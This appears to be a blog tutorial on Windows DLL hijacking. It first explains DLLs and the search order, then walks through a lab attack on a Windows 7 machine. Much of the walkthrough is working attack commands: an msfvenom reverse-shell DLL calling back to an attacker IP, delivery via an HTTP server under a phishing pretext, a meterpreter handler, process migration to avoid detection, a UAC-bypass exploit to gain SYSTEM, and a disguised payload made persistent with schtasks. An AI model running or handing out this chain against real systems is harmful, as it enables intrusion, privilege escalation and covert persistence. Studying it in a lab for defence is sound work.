# DLL Hijacking

**DLL Hijacking** is a type of cyberattack where an attacker abuses the way a system searches for Dynamic Link Libraries (DLLs). The attacker tricks a program into loading a malicious DLL instead of the legitimate one, gaining code execution on the victim machine.

This attack is possible because Windows follows a predictable **DLL search order** when loading DLLs. By placing a malicious DLL in a location that is searched first, attackers hijack the legitimate loading process.

## What is a DLL file? <a href="#b862" id="b862"></a>

DLL (stands for dynamic link library) is a file containing reusable code and data which multiple programs can use at the same time to perform different functions, improving efficiency and modularity in software development.

*Imagine you have a box of LEGO bricks. Each brick functions as a unique tool that may be used for a variety of activities. Now, certain tools are kept in smaller boxes with names like “drawing tools,” “building tools,” and so on instead of everything being kept in one large box.*

Similar to those smaller boxes with labeling are DLLs. It is a set of resources that various software applications may use. When a software requires a tool, it searches for it in the appropriate named box (DLL). As you would choose the appropriate LEGO set to discover the appropriate tool for the job. One DLL file can be used by different programs at the same time.

Dynamic-link library is Microsoft’s implementation of the shared library concept in the Microsoft Windows, so if you want to know more about this concept, you can search for “**shared libraries**”.

<figure><img src="https://miro.medium.com/v2/resize:fit:1318/1*RlP-CTgxVh66uSH_bdESug.png" alt="" height="96" width="659"><figcaption><p>Fig. 1 - Example DLL File</p></figcaption></figure>

DLLs are created by developers by writing custom code that performs specific functions (drawing images, computing math, or connecting to the internet etc.) These functions are similar to the tools we discussed earlier.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*COIqsiE_rYUyPRX2VS2l6Q.png" alt="" height="966" width="700"><figcaption><p>Fig. 2 — An example DLL Code</p></figcaption></figure>

Figure 2 demonstrates an implementation of a dynamic link library that defines functions for generating a Fibonacci sequence that can be used by other programs to generate Fibonacci sequences.

If you want to learn more about how to create your own DLC files see the official MS walkthrough below.

[Walkthrough: Create and use your own Dynamic Link Library (C++)Use C++ to create a Windows dynamic-link library (DLL) in Visual Studio.learn.microsoft.com](https://learn.microsoft.com/en-us/cpp/build/walkthrough-creating-and-using-a-dynamic-link-library-cpp?view=msvc-170\&source=post_page-----ea60b0f2a1d8---------------------------------------)

The code is written in a programming language like C++ or C# and then compiled into a DLL file, which is a kind of special file that contains the compiled code and data.

## How DLL Works? <a href="#a915" id="a915"></a>

At this point we know what a DLL is and why it is used. Below let’s see how a DLL works after you click a program that requires it step by step.

### **Loading dll into memory** <a href="#id-969e" id="id-969e"></a>

After you click on a executable (.exe), the operating system (OS) loads the program into memory and starts its execution. If the program requires a DLL, the operating system will first need to load the DLL into memory. This is done by searching for the DLL in a few different locations, such as the system directory, the program directory, and the current directory. Once the DLL is found, it is loaded into memory and made available to the program.

### Load-time vs. run-time dynamic linking <a href="#b72d" id="b72d"></a>

> When you load a DLL in an application, two methods of linking let you call the exported DLL functions. The two methods of linking are load-time dynamic linking and run-time dynamic linking. —[ From MS Learn](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)

**Load time linking**

* The linker resolves all the references to functions and variables in the DLL at compile time.
* This means that the program can call functions in the DLL directly, without having to load the DLL into memory at runtime.
* This makes executable file bigger, but makes the program faster.

**Runtime linking**

* The linker does not resolve all the references to functions and variables in the DLL at compile time.
* Instead, it creates a stub in the program’s executable file that calls the LoadLibraryEx function to load the DLL into memory at runtime.
* The program can then call functions in the DLL by calling the GetProcAddress function to get the address of the function in the DLL.
* This makes the program’s executable file smaller, but it also makes the program slower.

### DLL Search Order <a href="#c5dc" id="c5dc"></a>

When you start an **.exe** file file that requires a DLL, The *DLL loader (*&#x69;s a part of the operating system) starts searching for that specific DLL on the system. The files are searched according to certain rules, known as **DLL Search Order.**

The default DLL search order for Windows is as follows:

1. The directory from which the application is loaded.
2. The system directory. (example: “**C:\Windows\System32**")
3. The Windows Directory (“**C:\Windows.”**)
4. The current directory.
5. Directories Listed in the system **PATH** Environment Variable
6. Directories in the user **PATH** environment variable
7. The directories that are listed in the **PATH** environment variable.

This concept is critical in DLL hijacking. During this process, we can inject our own malicious DLLs into locations where DLL Loader searches for the innocent DLL. We will come to this in later chapters.

## DLL Hijacking <a href="#id-6efb" id="id-6efb"></a>

After having an idea about DLL files and their working mechanism, we can dig into the concept of DLL hijacking.

### What is the idea of DLL hijacking? <a href="#c69f" id="c69f"></a>

Most of the time the main idea is to exploit the **search order** that programs use to find and load DLLs. An attacker can mislead a software into loading harmful code instead of the desired, genuine DLL by inserting a malicious DLL in a spot where the program looks for DLLs. This way an attacker can **escalate privileges** and **gain persistence** on the system. This is why I emphasized search order in the previous chapter.

Altough i mentioned only search order manipulation, there are several options, and the effectiveness of each depends on how the program is set up to load the necessary DLLs. Potential strategies include:

**Phantom DLLs**: It works by placing a fake malicious DLL with a name similar to a legitimate one in a directory where a program searches for DLLs, potentially causing the program to load the malicious phantom DLL instead of the intended legitimate DLL.

**DLL replacement**: In DLL replacement the attacker tries to swap out a legitimate DLL with a malicious one. It can be combined with [DLL Proxying.](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)

**DLL Search Order Hijacking:** In a search order hijacking attack, an attacker manipulates the order in which a program looks for dynamic link libraries (DLLs), allowing them to store a malicious DLL at a location that the program searches first, resulting in the malicious DLL being loaded instead of the genuine one.

**DLL Side Loading Attack:** Attackers may use side-loading DLLs to run their own malicious payloads. Side-loading includes controlling which DLL a program loads, similar to DLL Search Order Hijacking. However, attackers may directly side-load their payloads by putting a legitimate application in the search order of a program, then calling it to execute their payload(s), as opposed to just planting the DLL and waiting for the victim application to be executed.

### Finding Missing DLL Files <a href="#d759" id="d759"></a>

Missing DLL files are a great opportunity for attackers to take advantage of their absence. If a DLL is missing from the system, they can try to place an imitation of the original DLL to use for otheir own purposes, including escalating privileges.

Process Monitor can be used to track down failed DLL loadings in the system. Here’s how to do it step by step:

1. Download Process Monitor from [**this official link**](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon).
2. Unzip the file.
3. Click on “**pocmon.exe**”.
4. After that you will see various processes going on. Click the blue filter button in the top left.
5. You need to add two filters. The first one is “***Result is NAME NOT FOUND Includ*****e**” and the second one is “***PATH ends with .dll Include***”

<figure><img src="https://miro.medium.com/v2/resize:fit:1102/1*yeTQtGsSqe8W1rrH6G7iGA.png" alt="" height="62" width="551"><figcaption><p>Fig. 3 — Add these two figures as a filter (step 5)</p></figcaption></figure>

Now you can see a list of missing DLL’s in various processes. These load failures can be exploited by attackers in DLL Hijacking.

*Note: It’s impossible for me to show you all of the approaches and methods in DLL hijacking in this article. There are numerous techniques to detect vulnerable programs, DLL files and exploit them using different methods we have already discussed above. Instead, from now on I will dwell on some specific examples. I will put some useful links for those who want detailed information. Here is one of them:*

[DLL Side-loading & Hijacking | DLL Abuse Techniques OverviewDynamic-link library (DLL) side-loading and hijacking have been around for years and they are techniques that still…www.mandiant.com](https://www.mandiant.com/resources/blog/abusing-dll-misconfigurations?source=post_page-----ea60b0f2a1d8---------------------------------------)

### Exploiting Missing DLL Files <a href="#id-7a2b" id="id-7a2b"></a>

Lets imagine a scenerio that you found a vulnerable program in Windows that attempts to load `CFF ExplorerENU.dll` from the location the program is installed to.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*pP9rxDHlg_fZfYN5SYGp5Q.png" alt="" height="273" width="700"><figcaption><p>Fig. 4 — Process Monitor</p></figcaption></figure>

If you look at figure 4, you can see that the process is trying to load a DLL from the path “***C:\Program Files\NTCore\Explorer Suite**”,* which resulting in “***NAME NOT FOUND***” failure.

In this example we will try to exploit this missing DLL using [**msfvenom** ](https://www.offsec.com/metasploit-unleashed/msfvenom/)in **Kali Linux**.

### Step 1 - Create payload using msfvenom <a href="#df6e" id="df6e"></a>

To exploit missing DLL files in the target machine, first we need to set up a payload using **msfvenom** tool (optionally in kali).

> Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015. — [From metasploit.com](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

To create a payload, we will use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp  -ax86 -f dll LHOST=192.168.1.115 LPORT=4444 > CFF_ExplorerENU.dll
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*iYvbUS5Uqk_DeP1jJH3yng.png" alt="" height="110" width="700"><figcaption><p>Fig. 5 — Creating Payload</p></figcaption></figure>

After that you should be seeing the payload in your computer.

<figure><img src="https://miro.medium.com/v2/resize:fit:640/1*wIKojleKSBYqY_IjV_Tchg.png" alt="" height="241" width="320"><figcaption><p>Fig 6. — Generated Payload</p></figcaption></figure>

We will use this DLL to trick the Windows host into loading the payload instead of the missing one.

### Step 2— Place DLL file to target host <a href="#a376" id="a376"></a>

In this step it is necessary to somehow place the payload on the victim machine. There are many different methods and it is up to you which one to use. If you’re using a virtual machine as a victim you can simply drag & drop, but if you want to do something closer to real life scenarios you can try setting up a **http** server and then download it by victim machine assuming as if there is some kind of phishing attack going on.

In my example, I will host a simple **http** server on kali and then assume that the victim has been tricked into downloading the malicious DLL instead of the missing DLL.

Here is how can you host a server using **python3**:

```
python3 -m http.server --bind 192.168.1.115
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1268/1*Flaa89qaK2KRZFcA8wIYAA.png" alt="" height="80" width="634"><figcaption><p>Fig. 7 — Starting A Server</p></figcaption></figure>

Now after the server goes live, victim Windows7 machine has downloaded and replaced the missing DLL with this evil DLL file in our scenerio.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*85fMCXPOW4sscLk4Xm-nCg.png" alt="" height="396" width="700"><figcaption><p>Fig. 8 — Server</p></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1368/1*Ct4IRtFEv8P5n7swQ8FXew.png" alt="" height="332" width="684"><figcaption><p>Fig.9 — Replaced DLL</p></figcaption></figure>

### Step 3— Get shell using metasploit <a href="#b1ce" id="b1ce"></a>

Now after we delivered the payload successfully, we need to start up **metasploit** and set it up to recieve sessions from payload. Let’s do it step by step.

* Start metasploit using the command below:

```
$sudo msfconsole
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1220/1*CxNCgs9MRG0fn4fTxoT-3A.png" alt="" height="624" width="610"><figcaption><p>Fig 10 — Metasploit</p></figcaption></figure>

* We are going to use multi/handler to get a meterpreter shell.

```
use multi/handler
```

After typing the command above you should be seeing this:

<figure><img src="https://miro.medium.com/v2/resize:fit:948/1*isjVw5qUCutBOJqY8xITFg.png" alt="" height="62" width="474"><figcaption></figcaption></figure>

* Now we need to sey up LHOST and LPORT.

> [The LHOST is the IP address of the attacking computer and the LPORT is the port to listen on for a connection from the target computer. The “L” in both attribute names stands for “local”.](https://www.comparitech.com/net-admin/metasploit-cheat-sheet/)

To set LHOST you need to use your machine’s local IP address. You can learn it by typing `ip a` in terminal.

Setting LHOST:

```
set LHOST <YOUR LOCAL IP ADDRESS>
```

Settining LPORT: (4444 by default)

```
set LPORT 4444
```

* After setting lhost and lport, we will set our payload as:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

* Finally type `show options` to see if all options are set correctly.

```
show options
```

After you should be seeing an output like this:

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*yRA7skm_NlLZFtZFU_GQNg.png" alt="" height="379" width="700"><figcaption></figcaption></figure>

* Not we can run our exploit and start listening the victim machine to see if payload is activated or not. Type below:

```
exploit
```

Now reverse tcp handler should be started on your specified LHOST address as follows:

<figure><img src="https://miro.medium.com/v2/resize:fit:1052/1*PNlcKpQdRXnpvNaCNNmV5w.png" alt="" height="56" width="526"><figcaption></figcaption></figure>

At this point everything is set and all that needs to be done to give a shell to the attacker machine is to run the **.exe** file it is connected to and load the dll file into memory.

At this point victim machine starts `CFF Explorer`program and allow the malicious DLL to run. As soon as the DLL file is run, it should appear in the exploit process in metasploit. Let’s check our metasploit terminal after victim machine has executed the vulnerable program.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*v8tee3mO-tbzYmZ3-Ij-Gg.png" alt="" height="92" width="700"><figcaption></figcaption></figure>

***Yes! We got a meterpreter shell now.***

### Step 4— Escalating privileges with meterpreter shell <a href="#b872" id="b872"></a>

We have successfully executed our payload and had an access to the system using meterpreter. Now let’s see what can be done next.

We can simply start with typing `sysinfo` to see basic information about the target system and make sure we are on the right track.

<figure><img src="https://miro.medium.com/v2/resize:fit:1110/1*v1WNMj8bwMeuazYZZVY6Qw.png" alt="" height="178" width="555"><figcaption></figcaption></figure>

Type `ps` to see the list of active processes in victim machine. Look for admin privileged processes to migrate.

*Using the **migrate** post module, you can migrate to another process on the victim.*

Aftter checking active processes using ps, we will need the **PID** of the process we want to use. For example I will try to migrato to taskhost.exe with a PID of 1620.

```
migrate 1620
```

**Why we migrate?**: If a target system user thinks the process is strange, he can kill it, kicking us out of the system. Therefore, using the migrate command to switch to safer processes like explorer.exe or svchost.exe, which do not draw attention to themselves, is a good idea.

After migrating you can use `getpid`command to see current process that you are working on.

`getuid`command will show the real user ID of the calling process. This way we can tell whether we have escalated privilages or not.

<figure><img src="https://miro.medium.com/v2/resize:fit:582/1*6fSudwFuOccKHtBoLRBu_g.png" alt="" height="35" width="291"><figcaption></figcaption></figure>

After entering the command we learn that our current username is `WIN7/admin`. Altough it’s an admin account, we want higher privileges.

`NT AUTHORITY\SYSTEM`:It is the most powerful account on a Windows local instance. In our case it’s more powerful than `WIN7/admin`.

### Use GetSystem <a href="#id-3750" id="id-3750"></a>

The GetSystem commands use a variety of privilege escalation techniques to give attackers access to the SYSTEM account of a victim. If it hasn’t already been loaded, we must first load the ‘priv’ extension before using the getsystem command.

```
use privs
```

```
getsystem
```

This command may not always work properly, and can fail. In this we need to use other payloads exist in metasploit.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*5Yt9noXyDgQE6TJJxhYdGQ.png" alt="" height="127" width="700"><figcaption><p>Getsystem does not work</p></figcaption></figure>

If getsystem does not work, here is a method to gain elevated privilages using metasploit framework:

* Type background to send the current Meterpreter session to the background and return to the ‘msf’ prompt

```
background
```

* enter “search local exploit suggester”. This is a post-exploitation module that you can use to check a system for *local* vulnerabilities.

```
search local exploit suggester
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*l6JdKghRhjRvMBDzkbCj2Q.png" alt="" height="112" width="700"><figcaption></figcaption></figure>

* We will use this module:

```
use 0
```

* Now let’s look at to options using following command:

```
show options
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*sLyFyhm4ox0TTkOGTndVEA.png" alt="" height="100" width="700"><figcaption></figcaption></figure>

* As you can see, we need to set a `SESSION`. Check your active sessions by typing:

```
sessions
```

After that you should be seeing active session. We are going to use the session we have created using our DLL payload.

* Set the `SESSION`:

```
set session 1
```

Now payload is ready to run.

* Run the payload with this command:

```
exploit
```

If everything goes expected, you should see a list of vulnerabilities on the target system.

<figure><img src="https://miro.medium.com/v2/resize:fit:2000/1*V1-2hGMKnjoViCuFBrdBUQ.png" alt="" height="615" width="1000"><figcaption></figcaption></figure>

* There are several vulnerabilities detected on the target system. I’m going to try **“exploit/windows/local/bypassuac\_eventvwr”.**

```
use exploit/windows/local/bypassuac_eventvwr 
```

* Now enter show options again to see what should we set up before running the exploit.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*MOcFgTV1GYkAzLvCn-Miaw.png" alt="" height="342" width="700"><figcaption></figcaption></figure>

* We need to set session again. Set the session again and then run the exploit:

```
set session 1
```

```
run
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*khDsrnP55s2vKle9MNDz_g.png" alt="" height="169" width="700"><figcaption></figcaption></figure>

Success! A new session is opened as you can see above. Now type `getsystem` again to see if it works now:

```
getsystem
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1320/1*n9OVjJFYrZKcQirnGg5Tjg.png" alt="" height="34" width="660"><figcaption></figcaption></figure>

This time it worked. Use getuid again to see current username:

```
getuid
```

<figure><img src="https://miro.medium.com/v2/resize:fit:762/1*RxlNRiHWgvVDdh2WLbaJdw.png" alt="" height="33" width="381"><figcaption></figcaption></figure>

Now it returns `NT AUTHORITY\SYSTEM` instead of `WIN7/admin`. This means ***WE HAVE ESCALATED PRIVILEGES***.

After this point you can almost do whatever you want with the system. Attack was successful, we have system privileges and it’s up to you to decide what to do after.

Lastly let’s discuss what can be done to make our access to the system longer.

### Step 5— Ensuring Persistence using scheduled tasks <a href="#id-035a" id="id-035a"></a>

Remember that we need target program to load DLL file to get our meterpreter shell. If the user does not execute the program later, our access will be interrupted. Since we have system privileges now, it’s a good idea to find a way to remain persistent in the system.

> [There are many persistence techniques a hacker can use to become an advanced persistent threat to your network. Any access, action, or configuration changes that let them maintain their foothold on systems (e.g.: replacing or hijacking legitimate code, adding startup code, implanting a malware stub, etc.) can allow a hacker to achieve persistence.](https://www.beyondtrust.com/blog/entry/what-is-persistence-in-cybersecurity)

Various methods can be implemented to remain persisten on the network, including using schtasks to schedule a task to execute vulnerable executable file and then somehow hide it from the user. Instead, I will create a new payload and insert it to target machine using the system privileges i have gained previously. Here are the steps:

* Open msfvenom in a new terminal again using `msfvenom` command.
* Create a new payload. We will insert this .exe payload to the victim later on.

```
msfvenom -p windows/meterpreter/reverse_tcp   -f exe LHOST=<YOUR_LOCAL_IP> LPORT=4444 >subtasks.exe
```

The name of the payload is subtasks.exe, because I want it to be appears as an innocent file. You can set another name as you wish.

* Switch to meterpreter session.
* To upload an executable (exe) file from Kali Linux machine to the target computer using Meterpreter, we can use the “upload” command.

```
upload /path/to/YourProgram.exe /path/on/target/YourProgram.exe
```

I will install the subsystem.exe file to C:\Windows. You can specify the location as you wish.

<figure><img src="https://miro.medium.com/v2/resize:fit:1400/1*srIhFQcgcI2SBAGTY9Gg1g.png" alt="" height="63" width="700"><figcaption><p>Task Succeeded</p></figcaption></figure>

Note: You can verify the upload using:

```
meterpreter > shell
C:\> dir /s /b "C:\path\on\target\YourProgram.exe"
```

After that Our exe file must be installed on the target machine.

<figure><img src="https://miro.medium.com/v2/resize:fit:1234/1*Hbp9hE81RtBAEdMmZwe4Qg.png" alt="" height="42" width="617"><figcaption><p>You can see our payload here</p></figcaption></figure>

This file will do the same trick as our malicious DLL file. But since DLL files require to be loaded by a program to work, using an .exe file as payload is a good idea to remain persistent on the system.

### using schtasks <a href="#a22d" id="a22d"></a>

A scheduled task is a way to automate the execution of a program or script at specified intervals. In the context of maintaining persistence, you can use a scheduled task to run a script or connect back to a control system periodically, ensuring that you can regain access to the target system even if it’s restarted. This is done by using **schtasks** in Windows. We will run our uploaded payload daily this way. Here is how can you do it step by step:

* Open the session we have created and type the following command:

```
shell
```

This way we opened a standard terminal on the target host, in our case that’s **cmd**.

* Create a scheduled task to run our new exploit on the target computer daily:

```
schtasks /create /tn "subsystemprocess" /sc daily /st 20:00 /tr "C:\path\on\target\YourProgram.exe"
```

You can specify the “C:\path\on\target\YourProgram.exe” part according to the location of the payload you downloaded.

This command above schedules a daily task on the target system that executes a specified program you specified every day at 8:00 PM. This approach could be used as a way to gain persistence on the target system, ensuring that the specified program runs automatically at the specified time.

<figure><img src="https://miro.medium.com/v2/resize:fit:1384/1*uyzsf5HFXEWB0OTeTsTNIg.png" alt="" height="24" width="692"><figcaption><p>Success Message</p></figcaption></figure>

### Conclusion <a href="#id-68f5" id="id-68f5"></a>

In this article, I tried to explain the basics of DLL hijack through a sample virtual windows and the steps to be taken after performing the exploit. I hope it helps!
